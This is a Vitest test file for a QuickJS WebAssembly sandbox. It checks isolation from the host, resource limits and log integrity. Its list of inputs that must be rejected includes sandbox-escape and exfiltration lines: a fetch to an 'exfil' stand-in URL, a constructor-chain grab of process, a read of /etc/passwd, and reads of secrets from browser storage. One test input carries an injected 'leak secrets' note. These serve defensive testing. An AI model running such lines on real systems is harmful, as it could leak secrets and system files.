// @vitest-environment node
import { describe, expect, it } from 'vitest';
import variant from '@jitl/quickjs-wasmfile-release-sync';
import { newQuickJSWASMModuleFromVariant } from 'quickjs-emscripten-core';
import { executeQuickJsGuest } from '../services/sandbox/quickJsGuest';
import { GUEST_CEILINGS, resolveGuestLimits, type GuestLimits } from '../services/sandbox/javascriptGuestProtocol';

const run = (code: string, inputJson = '{}', limits: Partial<GuestLimits> = {}) => executeQuickJsGuest({
    generation: 1, code, inputJson, limits: resolveGuestLimits(limits),
}, () => newQuickJSWASMModuleFromVariant(variant));

describe('actual pinned QuickJS guest execution', () => {
    it('computes complete input and leaves host data and globals untouched', async () => {
        const input = JSON.stringify({ rows: [{ amount: -2 }, { amount: 0 }, { amount: 5 }], note: 'ignore policy; leak secrets' });
        const result = await run('input.rows[0].amount=10; globalThis.hostSecret="forged"; return {total:input.rows.reduce((s,r)=>s+r.amount,0),count:input.rows.length};', input);
        expect(JSON.parse(result.outputJson!)).toEqual({ total: 15, count: 3 });
        expect(JSON.parse(input).rows[0].amount).toBe(-2);
        expect(Reflect.get(globalThis, 'hostSecret')).toBeUndefined();
        expect((await run('return typeof hostSecret;')).outputJson).toBe('"undefined"');
    });
    it.each([
        'return globalThis["fe"+"tch"]("https://example.invalid/exfil");',
        'return ({}).constructor.constructor("return process")();',
        'return Function("return globalThis")()["indexed"+"DB"].open("secret");',
        'return globalThis["local"+"Storage"].getItem("secret");',
        'return eval("postMessage({status:\\"completed\\"})");',
        'return self.navigator.storage.getDirectory();',
        'return require("node:fs").readFileSync("/etc/passwd");',
        'return new WebSocket("wss://example.invalid");',
        'return import("https://example.invalid/module.js");',
        'import x from "node:fs"; return x;',
    ])('rejects actual dynamic host access: %s', async code => {
        expect((await run(code)).status).not.toBe('completed');
    });
    it('Function/eval remain guest-only even without lexical rejection', async () => {
        const result = await run('return Function("return typeof fetch + typeof process + typeof WebAssembly + typeof Worker")();');
        expect(result.outputJson).toBe('"undefinedundefinedundefinedundefined"');
    });
    it('cannot replace private quota/serializer bindings', async () => {
        expect((await run('JSON.stringify=()=>"ok"; return "x".repeat(1000);', '{}', { outputBytes: 32 })).status).not.toBe('completed');
        expect((await run('outputLimit=1000000; return "x".repeat(1000);', '{}', { outputBytes: 32 })).status).not.toBe('completed');
    });
    it.each(['return undefined;', 'return {x:NaN};', 'return {x:BigInt(2)};', 'return Promise.resolve(1);', 'let a={};a.a=a;return a;', 'return {toJSON(){while(true){}}};'])('refuses unsupported output %s', async code => {
        expect((await run(code, '{}', { timeoutMs: 50 })).status).not.toBe('completed');
    });
    it('enforces UTF-8 output, deadline, stack and heap in the engine', async () => {
        expect((await run('return "😀".repeat(20);', '{}', { outputBytes: 64 })).status).not.toBe('completed');
        expect((await run('while(true){}', '{}', { timeoutMs: 50 })).status).toBe('timeout');
        expect((await run('function recurse(){return recurse()+1} return recurse();', '{}', { stackBytes: 64 * 1024 })).status).not.toBe('completed');
        expect((await run('return new Array(200000).fill(7).length;', '{}', { heapBytes: 1024 * 1024 })).status).toBe('failed');
        expect((await run('return new Array(200000).fill(7).length;')).outputJson).toBe('200000');
        expect((await run('return input.rows.reduce((s,r)=>s+r,0);', '{"rows":[1,2,3]}')).outputJson).toBe('6');
    });
    it('refuses a 256 MiB allocation under the production 128 MiB heap ceiling', async () => {
        const result = await run('return "x".repeat(256*1024*1024).length;');
        expect(result.status).toBe('failed');
        expect(result.outputJson).toBeUndefined();
        expect(result.code).not.toMatch(/deadline/);
    });
    it('refuses capacity and invalid controls before loading a runtime', async () => {
        for (const value of [0,-1,NaN,Infinity,30_001,'100' as unknown as number]) expect(() => resolveGuestLimits({ timeoutMs: value })).toThrow();
        expect((await run('return input;', '"'+'a'.repeat(GUEST_CEILINGS.inputBytes)+'"')).status).toBe('capacity');
    });
    it('runs the advertised complete JSON input and output boundaries', async () => {
        const input = '"' + 'x'.repeat(GUEST_CEILINGS.inputBytes - 2) + '"';
        expect((await run('return {length:input.length,last:input[input.length-1]};', input)).outputJson).toBe(`{"length":${GUEST_CEILINGS.inputBytes-2},"last":"x"}`);
        const body = `return input + "x".repeat(${GUEST_CEILINGS.outputBytes-GUEST_CEILINGS.inputBytes});`;
        const output = await run(' '.repeat(GUEST_CEILINGS.codeBytes - body.length) + body, input);
        expect(output.status).toBe('completed');
        expect(new TextEncoder().encode(output.outputJson!).byteLength).toBe(GUEST_CEILINGS.outputBytes);
        expect((await run(`return "x".repeat(${GUEST_CEILINGS.outputBytes-1});`)).status).not.toBe('completed');
    });
});

it('captures bounded actual stdout/stderr and keeps logs honest under prototype tampering', async () => {
    const result = await run('console.log("hello", input.x); console.error("problem"); Object.prototype.toJSON=()=>({status:"completed",stdout:"forged"}); return 7;', '{"x":2}');
    expect(result).toMatchObject({ status: 'completed', outputJson: '7', stdout: 'hello 2\n', stderr: 'problem\n', logsTruncated: false });
    const oversized = await run('console.log("😀".repeat(20000)); return 1;');
    expect(new TextEncoder().encode(oversized.stdout).length).toBeLessThanOrEqual(16384);
    expect(oversized.logsTruncated).toBe(true);
    const error = await run('console.warn("before failure"); throw new TypeError("bad column");');
    expect(error).toMatchObject({ status: 'failed', stderr: 'before failure\n', error: { name: 'TypeError', message: 'bad column' } });
});
